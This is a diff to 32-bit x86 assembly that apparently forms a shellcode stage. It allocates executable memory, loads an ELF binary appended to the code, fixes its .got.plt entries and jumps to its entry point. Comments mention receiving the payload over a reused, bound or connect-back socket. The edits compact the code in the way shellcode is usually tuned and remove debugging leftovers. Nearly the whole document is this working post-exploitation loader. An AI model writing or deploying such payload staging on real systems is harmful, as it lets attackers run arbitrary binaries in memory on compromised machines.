@@ -25,46 +25,43 @@ BITS 32
 main:
 	;; possible techniques for identifying where data is coming from
 	;; socket reuse, bind, connectback, attached at the end of our code
-	;; assume socket reuse with socket in EBX
-	push ebx
-	
 	
 	;; get some memory to work with
+	;; in mapper.c this is done with care
+	;; but if we make a "large" pre allocation up front we should be OK
 	xor eax,eax
+	cdq
 	mov al,mmap2
-	xor ebx,ebx 		;addr, don't care
+	xor ebx,ebx 		;addr
 	xor ecx,ecx
-	inc ecx
+	inc ecx			;size
 	shl ecx,15		;0x8000 potentially compute at runtime
-	xor edx,edx
-	mov dl, PROT_READ|PROT_WRITE|PROT_EXEC
-	xor esi,esi
-	or esi, byte MAP_PRIVATE | MAP_ANONYMOUS
-	xor edi, edi
+	;; 	xor edx,edx; done with cdq
+	mov dl, PROT_READ|PROT_WRITE|PROT_EXEC ;prot
+	push byte MAP_PRIVATE | MAP_ANONYMOUS ;flags
+	pop esi 
+	xor edi, edi				 ;FD
 	dec edi			;-1
-	xor ebp,ebp
+	xor ebp,ebp		;offset
 	
 	;;   mmap(0, 0x8000, 0x7, MAP_PRIVATE | MAP_ANONYMOUS ,-1,0)
-	call [gs:0x10]		;__kernel_vsyscall
+	call [gs:ebp+0x10]		;__kernel_vsyscall
 	cld
 	;; int 0x80
 	
 	jmp ENDOFCODE
-	have_elf:
+	have_elf:		
 	pop ebp			;pointer to elf header
-	mov edi,eax		; edi is pointer to the mapped memory	
+	mov ebx,eax		; ebx is pointer to the mapped memory for rest of code	
 ;;;Elf32_Shdr* strtab = mem + ehdr->e_shoff + ehdr->e_shstrndx * ehdr->e_shentsize;
 	mov esi, [ebp+e_shoff]
-	movzx ebx, word [ebp+e_shstrndx]
+	movzx edi, word [ebp+e_shstrndx]
 	movzx ecx, word [ebp+e_shentsize]
-	imul ebx,ecx
+	imul edi,ecx
 	add esi,ebp
-	add esi,ebx
+	add esi,edi
 	push esi
 	;; esi=strtab
-
-
-	mov ebx,edi		;hold a pointer to our memory in ebx
 
 
 	;; create memory sections
@@ -78,8 +75,8 @@ create_memory_sections:
 	add eax,dword [ebp+e_shoff]
 	add eax,ebp
 	;; eax=shdr
-	mov esi,1
-	mov ecx, dword [eax+sh_type]
+	;; mov esi,1
+	;; mov ecx, dword [eax+sh_type]
 	
 	;; cmp ecx,0xff
 	;; ja next_section
@@ -94,14 +91,17 @@ create_memory_sections:
 	mov esi,dword [esi+sh_offset]
 	add esi,dword [eax+sh_name]
 	add esi,ebp
-	jmp get_got_plt
+	jmp short get_got_plt
 have_got_plt:	
 	pop edi
-	mov ecx,got_plt_end - got_plt-1 ;length of the .got.plt string
 	
-	repe cmpsb
+	push byte got_plt_end - got_plt-1 ;length of the .got.plt string
+	pop ecx
+	
+	repe cmpsb		;strncmp
 	test ecx,ecx
 	jnz not_got_plt
+	
 	push eax		;got_plt section
 	
 not_got_plt:	
@@ -111,7 +111,7 @@ not_got_plt:
 	mov esi,dword [eax+sh_offset]
 	add esi,ebp		;src, the memory at the end of this asm
 	mov ecx,dword [eax+sh_size]	;length of the section
-	rep movsb
+	rep movsb			;memcpy
 next_section:	
 	dec edx
 	jns create_memory_sections ;will loop when the counter is zero
@@ -138,33 +138,16 @@ next_got_entry:
 	cmp ecx,2
 	ja fix_got_loop
 
-	;; get entry point
+	;; get entry point and run it
 	mov eax,dword [ebp+e_entry]
 	add eax,ebx
 	call eax			;entrypoint
-	hlt
-	
 
+	;; 	hlt ;hlt was for debugging
 get_got_plt:	
-call have_got_plt
+	call  have_got_plt
 got_plt:	db ".got.plt",0
 got_plt_end:
 ENDOFCODE:
- 	call have_elf
-	;; for debugging we need to find the elf header
-	
-;; findelfheader:			
-;; 	call $+5
-;; 	pop eax
-;; 	add eax,0x20		;ignore this code
-;; .test:
-;;         mov ecx,dword [eax]
-;;         cmp ecx,ELFHEADER
-;;         jz findelfheader.fin
-;;         inc eax
-;;         jmp findelfheader.test
-;;  .fin:
-;;         push eax
-;; 	jmp have_elf
-	
-	
+ 	call  have_elf
+	;; append elf here
